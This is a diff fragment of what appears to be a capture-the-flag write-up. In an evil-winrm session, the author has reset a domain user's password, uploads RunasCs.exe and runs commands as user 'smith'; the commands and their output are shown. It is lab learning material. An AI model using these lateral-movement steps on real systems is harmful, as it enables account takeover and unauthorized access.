@@ -304,3 +304,19 @@ evil-winrm-py PS C:\Users\oliver\Desktop> Set-DomainUserPassword -Identity 'smit
 
 Ill change the users password
 
+```python
+evil-winrm-py PS C:\Users\oliver\Desktop> upload RunasCs.exe .
+```
+
+Ill upload runascs
+
+```python
+evil-winrm-py PS C:\Users\oliver\Desktop> .\RunasCs.exe smith Password123! 'whoami'
+[*] Warning: The logon for user 'smith' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+object\smith
+evil-winrm-py PS C:\Users\oliver\Desktop>
+```
+
+I can now execute commands as this user
+
